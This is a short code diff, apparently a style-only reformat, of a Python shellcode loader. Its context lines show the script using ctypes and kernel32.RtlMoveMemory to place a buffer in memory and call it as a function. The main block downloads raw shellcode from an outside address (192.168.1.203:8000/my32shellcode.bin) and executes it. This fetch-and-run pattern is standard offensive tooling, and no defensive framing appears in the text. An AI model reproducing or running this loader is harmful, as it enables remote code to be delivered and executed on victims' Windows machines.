@@ -23,7 +23,8 @@ def write_memory(buf):
     kernel32.RtlMoveMemory.argtypes = (
         ctypes.c_void_p,
         ctypes.c_void_p,
-        ctypes.c_size_t)
+        ctypes.c_size_t,
+    )
     kernel32.RtlMoveMemory(ptr, buf, length)
     return ptr
 
@@ -35,7 +36,7 @@ def run(shellcode):
     shell_func()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     url = "http://192.168.1.203:8000/my32shellcode.bin"
     shellcode = get_code(url)
     run(shellcode)
